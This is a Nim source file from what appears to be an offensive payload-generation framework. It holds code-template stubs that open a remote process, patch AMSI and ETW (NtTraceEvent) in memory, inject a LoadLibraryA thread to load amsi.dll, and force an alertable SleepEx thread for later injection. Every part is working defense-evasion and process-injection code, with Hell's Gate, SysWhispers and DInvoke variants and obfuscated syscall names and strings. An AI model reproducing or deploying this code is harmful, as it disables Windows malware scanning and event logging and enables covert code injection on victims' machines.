            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
        
        else:
            when not defined(spawninject):
                when defined(Hellsgate):
                    if getSyscall(ntOpenTable):
                        syscall = ntOpenTable.wSysCall
                    else:
                        when defined(verbose):
                            echo obf("[-] Failed to find opcode for NtOpenProcess")
                var hProcss: HANDLE
                var oa2: OBJECT_ATTRIBUTES
                var cid2: CLIENT_ID
                cid2.UniqueProcess = processID
                var statusamsi = NtOpenProcess(
                    &hProcss,
                    PROCESS_ALL_ACCESS, 
                    &oa2, &cid2         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(statusamsi)
        
        when not defined(spawninject):
            var procHandle2: HANDLE = hProcss
        else:
            var procHandle2: HANDLE = tProcess

        success = RemotePatchAmsi(procHandle2)
        if (success == 0):
            success = remoteLoadAmsi(remoteProcID)
            HowMuchTimeWouldYoulikeToSleep(4)
            success = RemotePatchAmsi(procHandle2)
        when defined(verbose):
            echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

    #amsRemote()

"""


let RemoteLoadAMSIStub* = """

    proc remoteLoadAmsi(processID: var DWORD): bool =

    
        # C:\windows\system32\amsi.dll
        var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
        char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
        char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
        
        when defined(verbose):
            echo obf("[*] Loading amsi.dll in the remote process: "), processID
        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        when not defined(spawninject):
            var tProcess: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)

                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            if(status == 0):
                return true
            else:
                return false
        else:
            
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)

            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                tProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                tProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
            when defined(verbose):
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                tProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                tProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            status = NtClose(tHandle)
            
            if(status == 0):
                return true
            else:
                return false


"""



let RemotePatchETWStub* = """


    proc RemotePatchETW(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        elif defined i386:
            let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112


        var disabled: bool = false
        
        # local process and remote process ntdll.dll addresses are equal.
        when defined(DInvoke):
            var ntdlldll = MyGetModuleHandleA(obf("ntdll.dll"))
        else:
            var ntdlldll = GetModuleHandleA(obf("ntdll.dll"))
    
        when defined(DInvoke):
            var RemoteProc = MyGetProcAddress(ntdlldll, obf("NtTraceEvent"))
        else:
            var RemoteProc = GetProcAddress(ntdlldll,"NtTraceEvent")
        if isNil(RemoteProc):
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'NtTraceEvent'")

        
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall ETW patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        var cid: CLIENT_ID
        when not defined(spawninject):
            var hProcssetw: HANDLE
        var status: NTSTATUS
        cid.UniqueProcess = remoteProcID
        var oa: OBJECT_ATTRIBUTES
        when defined(SysWhispers):
            when not defined(spawninject):
                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            when not defined(spawninject):
                status = NtOpenProcess(
                    &hProcssetw,
                    PROCESS_ALL_ACCESS, 
                    &oa, &cid         
                )
                when defined(verbose):
                    echo obf("[*] NtOpenProcess: "), toHex(status)
        
        when not defined(spawninject):
            var procHandle: HANDLE = hProcssetw
        else:
            var procHandle: HANDLE = tProcess

        success = RemotePatchETW(procHandle)
        
        when defined(verbose):
            echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"


"""


let RemoteLoadNTDLLStub* = """

    # Ntdll.dll is always loaded, this made no sense

"""


let RemoteForceSleepStub* = """

    proc remoteForceSleep(targetProcess: HANDLE): HANDLE =

    
        # A long Sleep time, so that for any sleep-in-between time, the thread will still be in an alertable state
        var friendlycode: array[3, char]  = [char(0xFF), char(0xFF), char(0xFF)]
        
        when defined(verbose):
            echo obf("[*] Forcing Sleep for alertable state thread in the remote process: "), targetProcess
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)


        when defined(SysWhispers):
            status = oqiahsjynmxkla(targetProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            status = oqiazasusjk(targetProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("kernel32.dll")), obf("SleepEx")));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,targetProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            
            if(status == 0):
                return tHandle
            else:
                return 0
        else:
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
                targetProcess, &ds, 0, &sc_size, 
                MEM_COMMIT, 
                PAGE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                targetProcess, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            
            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            
            var oldProtect: DWORD
            var targetAddress: LPVOID = ds
            status = NtProtectVirtualMemory(
                targetProcess, 
                addr targetAddress, 
                &sc_size, 
                PAGE_READONLY, 
                addr oldProtect)
            
            when defined(verbose):
                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
            
            when defined(DInvoke):
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
            else:
                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
            
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")

            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                targetProcess,
                pfnThreadRtn, 
                ds, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)
            #status = NtClose(tHandle)

            if(status == 0):
                return tHandle
            else:
                return 0
            

"""